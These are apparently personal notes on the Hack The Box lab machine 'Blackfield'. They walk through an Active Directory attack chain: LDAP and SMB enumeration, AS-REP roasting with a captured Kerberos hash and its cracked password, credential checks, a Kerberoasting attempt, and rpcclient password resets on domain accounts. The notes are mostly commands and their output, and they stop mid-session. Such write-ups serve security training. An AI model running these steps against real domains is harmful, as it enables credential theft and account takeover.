### From LDAP to DNS then back to LDAP
##### Get domains
```bash
root@kali# ldapsearch -h 10.129.1.243 -x -s base namingcontexts

namingcontexts: DC=BLACKFIELD,DC=local
namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
```

##### Dig domain
```bash
dig @10.129.1.243 ForestDnsZones.BLACKFIELD.local
dig @10.129.1.243 DomainDnsZones.BLACKFIELD.local
```

##### LDAP again
```bash
ldapsearch -h $IP -x -b "DC=BLACKFIELD,DC=local" | tee ldap-anonymous # anonymous login
```

### SMB
https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#smb---tcp-445

```bash
crackmapexec smb $IP

smbclient -N -L \\\\$IP

smbmap -u null -p "" -H $IP -P 445
```

##### mount and list users as that's the obvious hint
There is an opportunity to create a list of usernames
```bash
sudo mount -t cifs //$IP/profiles$ /mnt
```

use -1 in ls to print only the directories one per line:
```bash
ls -1 /mnt/ > users
```

### UF_DONT_REQUIRE_PREAUTH set to true
https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#as-rep-roast

```bash
for user in $(cat users); do ./GetNPUsers.py -no-pass -dc-ip $IP blackfield.local/$user ; done
for user in $(cat users); do ./GetNPUsers.py -no-pass -dc-ip $IP blackfield.local/$user | grep krb5asrep; done

# Or use usersfile instead of for loop

./GetNPUsers.py blackfield.local/ -no-pass -usersfile users -dc-ip $IP | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'

$krb5asrep$23$support@BLACKFIELD.LOCAL:8a1e7ddb1873d327b07f1ab17984ec19$2aefece1a101fca7f6ba50b9566d0820ff6c0aa69bc4fbb1c0fb522a47c9bcfeca825a52f0f80f8e9e24adee03954637d8e13a99147f7d0f5a7704e8fe9859393c279cd0f6df14014a61ef3c0193191656bc4da3f7a8f91aaed8d0b65918d7db56fbff01a46233584f1f438ce82d79e78be99644673b097ed69ae997aeab3c3d724d506cc7d2887ea3a71a35d9fb383ed2479262ca2819026dcdf01ffa013911e83ffacaad656916804a74e228b5992bff6d1b2e1959633cb7db64eee5c5f33a15bc7fe5c
```

### hashcat as usual
`hashcat --example-hashes | grep krb5asrep -B5`

There is chance that the hash is damaged. Just capture it and try again

#00^BlackKnight

### Try to login with evil-winrm and psexec.py
```bash
evil-winrm -i 10.129.1.243 -u support -p "#00^BlackKnight"

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
```

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py BLACKFIELD.LOCAL/support:'#00^BlackKnight'@BLACKFIELD.LOCAL

[*] Requesting shares on BLACKFIELD.LOCAL.....
[-] share 'ADMIN$' are not writable.
```

### Access Check should be done before trying login
##### winrm
```bash
crackmapexec winrm $IP -u support -p '#00^BlackKnight'
```

can't use winrm as expected. 

##### ldap
```bash
ldapsearch -h $IP -D cn=support,dc=blackfield,dc=local -w '#00^BlackKnight' -x -b 'dc=blackfield,dc=local'
```
can't do either `ldap_bind: Invalid credentials (49)`

##### smb is usually the one

```bash
crackmapexec smb $IP -u support -p '#00^BlackKnight'

smbmap -H $IP -u support -p '#00^BlackKnight'
```

### Kerberoasting since 88 is opening
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip $IP BLACKFIELD.LOCAL/support:'#00^BlackKnight' -save -outputfile GetUserSPNs.out
```

No entries found!

### Try rpcclient since none of them worked
```bash
rpcclient -U support $IP

enumdomusers
```
##### Reset some passwords
https://room362.com/post/2017/reset-ad-user-password-with-linux/

https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#forcechangepassword

```bash
rpcclient $> setuserinfo2 Administrator 23 'qwer1234' 
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
rpcclient $> setuserinfo2 audit2020 23 'qwer1234' 
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
rpcclient $> setuserinfo2 audit2020 23 'qwer1234!' 
rpcclient $> c
```

